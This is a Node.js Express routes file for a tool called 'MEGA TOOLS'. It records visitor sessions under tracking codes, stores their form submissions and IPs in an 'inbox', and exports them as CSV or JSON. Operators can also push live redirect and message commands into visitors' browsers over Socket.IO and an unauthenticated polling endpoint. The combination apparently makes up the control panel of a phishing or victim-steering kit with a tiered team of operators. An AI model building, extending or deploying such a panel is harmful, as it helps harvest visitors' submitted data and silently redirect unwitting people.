// ============================================================
// MEGA TOOLS — SESSIONS ROUTES (Enterprise Standard)
// HYBRID SMART REDIRECT: Socket.IO + DB Pending + HTTP Polling
// Clear All: Role-based PERMANENT DELETE from MongoDB + JSON
// FIX: Removed global_command (L274) + msg_push targetUrl (L275)
//      Layer 1 (direct) + Layer 2 (room) sufficient for redirect.
//      Global emit now sends message only — no page reloads.
// FIX: pending-command now clears after delivery (polling loop fix)
// FIX: stats/summary — lastActivity priority + all-time total added
// ============================================================

const express = require('express');
const router = express.Router();
const db = require('../database');
const Session = require('../models/Session');
const Link = require('../models/Link');
const User = require('../models/User');
const { ROLES } = require('../models/roles');
const { authenticate } = require('../middleware/auth');
const { getSessionSockets } = require('../services/sessionManager');
const { toStringId, parseTrackingCode, paginate, now } = require('../utils/helpers');
const CONFIG = require('../config');

// ============================================================
// HELPERS
// ============================================================

function isSessionForAnyCode(session, codes) {
  if (!session || !codes || codes.length === 0) return false;
  const tc = session.trackingCode || '';
  return codes.some(code => tc === code || tc.startsWith(code + '_'));
}

async function getUserTrackingCodes(userId) {
  return User.getTrackingCodesForUser(userId);
}

async function filterSessionsByRole(sessions, user) {
  if (user.role === ROLES.OWNER) return sessions.filter(s => !s.hiddenForAll);
  const codes = await getUserTrackingCodes(user._id);
  const userId = toStringId(user._id);
  let filtered = sessions.filter(s => isSessionForAnyCode(s, codes));
  filtered = filtered.filter(s => {
    if (s.hiddenForAll) return false;
    if (s.hiddenFor && s.hiddenFor.includes(userId)) return false;
    return true;
  });
  return filtered;
}

async function checkSessionAccess(session, user) {
  if (user.role === ROLES.OWNER) return true;
  const codes = await getUserTrackingCodes(user._id);
  return isSessionForAnyCode(session, codes);
}

// ============================================================
// GET SESSIONS
// ============================================================

router.get('/', authenticate, async (req, res) => {
  try {
    let sessions = await db.sessions.read();
    const pageNum = parseInt(req.query.page) || 1;
    const limitNum = parseInt(req.query.limit) || CONFIG.SESSIONS_PER_PAGE;

    sessions = sessions.filter(s => !s.hiddenForAll);

    if (req.user.role === ROLES.OWNER) {
      sessions.sort((a, b) => {
        if (a.isLive && !b.isLive) return -1;
        if (!a.isLive && b.isLive) return 1;
        return new Date(b.timestamp) - new Date(a.timestamp);
      });
      const result = paginate(sessions, pageNum, limitNum);
      return res.json({ sessions: result.data, total: result.total, page: result.page, totalPages: result.totalPages, hasMore: result.hasMore });
    }

    sessions.sort((a, b) => {
      if (a.isLive && !b.isLive) return -1;
      if (!a.isLive && b.isLive) return 1;
      return new Date(b.timestamp) - new Date(a.timestamp);
    });

    const codes = await getUserTrackingCodes(req.user._id);
    const userId = toStringId(req.user._id);
    const filtered = [];
    let totalFiltered = 0;

    for (const s of sessions) {
      if (s.hiddenForAll) continue;
      if (!isSessionForAnyCode(s, codes)) continue;
      if (s.hiddenFor && s.hiddenFor.includes(userId)) continue;
      totalFiltered++;
      if (filtered.length < limitNum) filtered.push(s);
    }

    const totalPages = Math.ceil(totalFiltered / limitNum);
    const startIdx = (pageNum - 1) * limitNum;
    const paginatedSessions = [];
    let count = 0;
    for (const s of sessions) {
      if (s.hiddenForAll) continue;
      if (!isSessionForAnyCode(s, codes)) continue;
      if (s.hiddenFor && s.hiddenFor.includes(userId)) continue;
      if (count >= startIdx && paginatedSessions.length < limitNum) paginatedSessions.push(s);
      count++;
      if (paginatedSessions.length >= limitNum && count >= startIdx + limitNum) break;
    }

    res.json({ sessions: paginatedSessions, total: totalFiltered, page: pageNum, totalPages, hasMore: pageNum < totalPages });
  } catch (err) {
    console.error('[Sessions] GET error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// STATS SUMMARY
// FIX: lastActivity priority (not timestamp) + all-time total
// ============================================================

router.get('/stats/summary', authenticate, async (req, res) => {
  try {
    let all = await db.sessions.read();
    all = all.filter(s => !s.hiddenForAll);
    all = await filterSessionsByRole(all, req.user);

    const todayStart = new Date();
    todayStart.setHours(0, 0, 0, 0);
    const todayMs = todayStart.getTime();

    // FIX: lastActivity priority — more accurate for recent activity
    const todaySessions = all.filter(s => {
      const sessionTime = new Date(s.lastActivity || s.timestamp).getTime();
      return sessionTime >= todayMs;
    });

    const uniqueVisitorIds = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean));

    const allSubs = [];
    todaySessions.forEach(s => {
      if (s.submissions?.length > 0) {
        s.submissions.forEach(sub => allSubs.push(JSON.stringify(sub)));
      }
    });
    const uniqueSubmissions = new Set(allSubs);

    // All-time counts
    const allTimeVisitorIds = new Set(all.map(s => s.visitorId || s.ip).filter(Boolean));
    let allTimeSubmissions = 0;
    all.forEach(s => { allTimeSubmissions += (s.submissions?.length || 0); });

    res.json({
      all: {
        live: todaySessions.filter(s => s.isLive).length,
        mobile: todaySessions.filter(s => s.deviceType === 'Mobile').length,
        desktop: todaySessions.filter(s => s.deviceType === 'Desktop').length,
        uniqueSessions: uniqueVisitorIds.size,
        uniqueSubmissions: uniqueSubmissions.size,
        total: todaySessions.length,
        totalAllTime: all.length,
        totalAllTimeSubmissions: allTimeSubmissions,
      }
    });
  } catch (err) {
    console.error('[Sessions] Stats error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// ONLINE USERS
// ============================================================

router.get('/online', authenticate, async (req, res) => {
  try {
    const allSessions = await db.sessions.read();
    const allUsers = await db.users.read();
    const nowMs = Date.now();
    const onlineSessions = allSessions.filter(s => {
      if (s.hiddenForAll) return false;
      const lastActivity = new Date(s.lastActivity || s.timestamp || Date.now()).getTime();
      return (nowMs - lastActivity) < CONFIG.SESSION_TIMEOUT_MS;
    });
    const userIdSet = new Set();
    for (const s of onlineSessions) {
      if (s.trackingCode) {
        const user = allUsers.find(u => u.trackingCode && s.trackingCode.startsWith(u.trackingCode));
        if (user) userIdSet.add(toStringId(user._id));
      }
    }
    const onlineUsers = allUsers.filter(u => userIdSet.has(toStringId(u._id)));
    res.json(onlineUsers.map(u => ({
      _id: toStringId(u._id), name: u.name || u.fullName || u.username || 'Unknown',
      username: u.username || '', email: u.email || '', role: u.role || 'user',
      profilePic: u.profilePic || '', trackingCode: u.trackingCode || '', parentId: u.parentId || null,
    })));
  } catch (err) {
    console.error('[Sessions] Online error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// HIDE SESSION (Individual Hide)
// ============================================================

router.post('/:id/hide', authenticate, async (req, res) => {
  try {
    const session = await Session.hideFromUser(req.params.id, req.user._id);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    res.json({ message: 'Hidden', sessionId: req.params.id });
  } catch (err) {
    console.error('[Sessions] Hide error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// HYBRID SMART COMMAND SYSTEM
// Layer 1: Socket.IO direct emit (fastest)
// Layer 2: Store pending command in session DB (fail-safe)
// Layer 3: HTTP polling endpoint for visitor to check
// ============================================================

// ============================================================
// UNIVERSAL COMMAND (Enhanced with Hybrid Fallback)
// ============================================================

router.post('/:id/command', authenticate, async (req, res) => {
  try {
    const { action, url, message } = req.body;
    const session = await db.sessions.findById(req.params.id);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    if (!(await checkSessionAccess(session, req.user))) return res.status(403).json({ message: 'Access denied' });

    // Record command in session history
    const updatedSession = await Session.recordCommand(req.params.id, {
      action: action || 'navigate',
      url: url || '',
      message: message || ''
    });

    // ===== LAYER 2: Store pending command in session for HTTP polling =====
    updatedSession.pendingCommand = {
      action: action || 'navigate',
      url: url || '',
      message: message || '',
      seq: updatedSession.commandSeq,
      timestamp: now(),
      expiresAt: new Date(Date.now() + 60000).toISOString() // 60 seconds TTL
    };
    await db.sessions.findByIdAndUpdate(req.params.id, { pendingCommand: updatedSession.pendingCommand });

    // ===== LAYER 1: Socket.IO real-time emit =====
    const io = req.app.get('io');
    const sockets = getSessionSockets();
    const command = {
      action: action || 'navigate', url: url || '', message: message || '',
      seq: updatedSession.commandSeq,
      visitorId: updatedSession.visitorId,
      trackingCode: updatedSession.trackingCode,
      timestamp: now(),
    };

    let socketEmitted = false;
    let roomEmitted = false;

    if (io && sockets) {
      // Direct socket emit to specific visitor (FULL: message + targetUrl)
      if (updatedSession.visitorId) {
        const socketId = sockets[updatedSession.visitorId];
        if (socketId) {
          io.to(socketId).emit('session_command', command);
          io.to(socketId).emit('msg_push', { message: message || '', targetUrl: url || '' });
          socketEmitted = true;
        }
      }
      // Room emit to trackingCode room (FULL: message + targetUrl)
      if (updatedSession.trackingCode) {
        io.to('room_' + updatedSession.trackingCode).emit('session_command', command);
        io.to('room_' + updatedSession.trackingCode).emit('msg_push', { message: message || '', targetUrl: url || '' });
        roomEmitted = true;
      }
    }

    // ===== LAYER 3: Global emit — MESSAGE ONLY =====
    if (io) {
      io.emit('msg_push', { message: message || '' });
    }

    res.json({
      success: true,
      message: 'Command sent',
      command,
      sessionId: req.params.id,
      delivery: {
        socket: socketEmitted,
        room: roomEmitted,
        pendingDB: true,
        global: true
      }
    });
  } catch (err) {
    console.error('[Sessions] Command error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// REDIRECT-NEW
// ============================================================

router.post('/:id/redirect-new', authenticate, async (req, res) => {
  req.body.action = req.body.message ? 'navigate+message' : 'navigate';
  req.body.url = req.body.targetUrl;
  req.url = '/' + req.params.id + '/command';
  router.handle(req, res);
});

// ============================================================
// HTTP POLLING: Visitor checks for pending commands
// No auth required — visitor uses trackingCode + visitorId
// ============================================================

router.get('/pending-command/:trackingCode', async (req, res) => {
  try {
    const { trackingCode } = req.params;
    const visitorId = req.query.visitorId || '';
    const seq = parseInt(req.query.seq) || 0;

    if (!trackingCode) {
      return res.status(400).json({ success: false, message: 'trackingCode required' });
    }

    const allSessions = await db.sessions.read();
    
    // Find session by trackingCode + visitorId
    let session = null;
    if (visitorId) {
      session = allSessions.find(s => s.visitorId === visitorId && !s.hiddenForAll);
    }
    if (!session) {
      const code = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
      session = allSessions.find(s => {
        const sCode = s.trackingCode ? (s.trackingCode.includes('_') ? s.trackingCode.split('_')[0] : s.trackingCode) : '';
        return sCode === code && !s.hiddenForAll;
      });
    }

    if (!session || !session.pendingCommand) {
      return res.json({ success: true, pending: false, message: 'No pending commands' });
    }

    // Check if this is a new command (seq > last seen)
    const pendingCmd = session.pendingCommand;
    if (pendingCmd.seq && pendingCmd.seq <= seq) {
      return res.json({ success: true, pending: false, message: 'Command already processed' });
    }

    // Check expiry
    if (pendingCmd.expiresAt && new Date(pendingCmd.expiresAt) < new Date()) {
      return res.json({ success: true, pending: false, message: 'Command expired' });
    }

    // Clear pending command after delivery to prevent polling redirect loop
    await db.sessions.findByIdAndUpdate(session._id, { pendingCommand: null });

    res.json({
      success: true,
      pending: true,
      command: {
        action: pendingCmd.action,
        url: pendingCmd.url,
        message: pendingCmd.message,
        seq: pendingCmd.seq,
        timestamp: pendingCmd.timestamp
      }
    });
  } catch (err) {
    console.error('[Sessions] Pending command error:', err);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============================================================
// CLEAR INBOX — User/Admin/Manager (SOFT HIDE)
// ============================================================

router.post('/clear-inbox', authenticate, async (req, res) => {
  try {
    const userId = toStringId(req.user._id);
    let sessions = await db.sessions.read();

    if (req.user.role === ROLES.OWNER) {
      let hidden = 0;
      for (const s of sessions) {
        if (s.hiddenForAll) continue;
        s.hiddenFor = s.hiddenFor || [];
        if (!s.hiddenFor.includes(userId)) {
          s.hiddenFor.push(userId);
          s.updated_at = now();
          hidden++;
        }
      }
      await db.sessions.write(sessions);
      const io = req.app.get('io');
      if (io) io.emit('inboxCleared', { userId, count: hidden });
      return res.json({ success: true, message: 'Inbox cleared', count: hidden });
    }

    const codes = await getUserTrackingCodes(req.user._id);
    let hidden = 0;
    for (const s of sessions) {
      if (s.hiddenForAll) continue;
      if (!isSessionForAnyCode(s, codes)) continue;
      s.hiddenFor = s.hiddenFor || [];
      if (!s.hiddenFor.includes(userId)) {
        s.hiddenFor.push(userId);
        s.updated_at = now();
        hidden++;
      }
    }
    await db.sessions.write(sessions);
    const io = req.app.get('io');
    if (io) io.emit('inboxCleared', { userId, count: hidden });
    res.json({ success: true, message: 'Inbox cleared', count: hidden });
  } catch (err) {
    console.error('[Sessions] Clear inbox error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// CLEAR ALL — Role-Based PERMANENT DELETE
// ============================================================
// Owner: Delete ALL sessions from DB
// Admin: Delete only own tracking code sessions
// Team Manager: Delete own + team tracking code sessions
// User: Delete only own tracking code sessions
// ============================================================

router.post('/clear-all', authenticate, async (req, res) => {
  try {
    let sessions = await db.sessions.read();
    const totalBefore = sessions.length;
    let sessionsToDelete = [];
    let sessionsToKeep = [];

    if (req.user.role === ROLES.OWNER) {
      await db.sessions.deleteAll();
      const io = req.app.get('io');
      if (io) io.emit('inboxCleared', { userId: toStringId(req.user._id), count: totalBefore, global: true, permanent: true });
      return res.json({ success: true, message: 'All sessions permanently deleted', count: totalBefore, role: 'owner' });
    }

    const codes = await getUserTrackingCodes(req.user._id);
    
    for (const s of sessions) {
      if (isSessionForAnyCode(s, codes)) {
        sessionsToDelete.push(s);
      } else {
        sessionsToKeep.push(s);
      }
    }

    const deletedCount = sessionsToDelete.length;

    if (deletedCount === 0) {
      return res.json({ success: true, message: 'No sessions to delete', count: 0, role: req.user.role });
    }

    await db.sessions.write(sessionsToKeep);

    if (db.sessions._col) {
      const idsToDelete = sessionsToDelete.map(s => s._id);
      try {
        await db.sessions._col.deleteMany({ _id: { $in: idsToDelete } });
      } catch (mongoErr) {
        console.error('[Sessions] MongoDB delete error:', mongoErr.message);
      }
    }

    const io = req.app.get('io');
    if (io) io.emit('inboxCleared', { userId: toStringId(req.user._id), count: deletedCount, permanent: true });

    res.json({ success: true, message: 'Your sessions permanently deleted', count: deletedCount, role: req.user.role });
  } catch (err) {
    console.error('[Sessions] Clear all error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// EXPORT — Download Inbox Data (Owner gets ALL, others get visible)
// ============================================================

router.get('/export', authenticate, async (req, res) => {
  try {
    let sessions = await db.sessions.read();
    
    if (req.user.role === ROLES.OWNER) {
      sessions = sessions.filter(s => !s.hiddenForAll);
    } else {
      sessions = await filterSessionsByRole(sessions, req.user);
    }
    
    const format = req.query.format || 'csv';

    if (format === 'json') {
      return res.json({
        success: true,
        count: sessions.length,
        exportedBy: req.user.role,
        data: sessions.map(s => ({
          sessionId: s._id,
          visitorId: s.visitorId,
          trackingCode: s.trackingCode,
          ip: s.ip,
          device: s.deviceType,
          browser: s.browser,
          status: s.status,
          isLive: s.isLive,
          clicks: s.clicks || 0,
          submissions: s.submissions?.length || 0,
          created: s.created_at,
          lastSeen: s.lastActivity,
        })),
        timestamp: now(),
      });
    }

    const headers = ['Session ID', 'Visitor ID', 'Tracking Code', 'IP', 'Device', 'Browser', 'Status', 'Live', 'Clicks', 'Submissions', 'Created', 'Last Seen'];
    let csv = headers.join(',') + '\n';
    sessions.forEach(s => {
      const row = [
        s._id || '',
        s.visitorId || '',
        s.trackingCode || '',
        s.ip || '',
        s.deviceType || '',
        (s.browser || '').replace(/,/g, ';'),
        s.status || '',
        s.isLive ? 'Yes' : 'No',
        s.clicks || 0,
        s.submissions?.length || 0,
        s.created_at || '',
        s.lastActivity || '',
      ];
      csv += row.join(',') + '\n';
    });

    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename=inbox_export_${Date.now()}.csv`);
    res.send(csv);
  } catch (err) {
    console.error('[Sessions] Export error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

module.exports = router;